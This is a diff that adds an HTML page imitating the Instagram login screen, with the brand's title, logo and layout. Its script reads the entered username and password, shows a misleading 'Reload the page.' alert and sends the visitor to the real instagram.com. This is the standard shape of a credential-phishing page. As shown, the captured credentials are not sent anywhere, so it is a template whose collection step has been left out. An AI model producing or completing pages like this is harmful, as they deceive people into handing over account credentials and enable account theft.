@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        .form-container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 10px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .form-container img {
+            margin: 22px auto;
+            display: block;
+        }
+        .form-container form {
+            display: flex;
+            flex-direction: column;
+        }
+        .form-container input {
+            font-size: 14px;
+            padding: 9px 0 7px 8px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            outline: none;
+        }
+        .form-container input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        .form-container button {
+            margin: 8px 0;
+            padding: 8px 0;
+            background: #0095f6;
+            border: none;
+            color: #fff;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .form-container .or {
+            position: relative;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .form-container .or:before, .form-container .or:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 38%;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .form-container .or:before {
+            left: 0;
+        }
+        .form-container .or:after {
+            right: 0;
+        }
+        .form-container a {
+            color: #385185;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 18px;
+        }
+        .form-container a:hover {
+            text-decoration: underline;
+        }
+        .signup-container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+        }
+        .signup-container p {
+            font-size: 14px;
+            margin: 0;
+        }
+        .signup-container a {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .signup-container a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="form-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" width="175">
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                <div class="or">OR</div>
+                <a href="#">Log in with Facebook</a>
+                <a href="#" style="color: #00376b; font-size: 12px; margin-top: 20px; display: block;">Forgot password?</a>
+            </form>
+        </div>
+        <div class="signup-container">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting the traditional way
+
+            // Capture the input field values
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Display the captured data in an alert box
+            alert('Reload the page.');
+
+            // Redirect to another URL after the alert
+            window.location.href = 'https://www.instagram.com/';
+        });
+    </script>
+</body>
+</html>
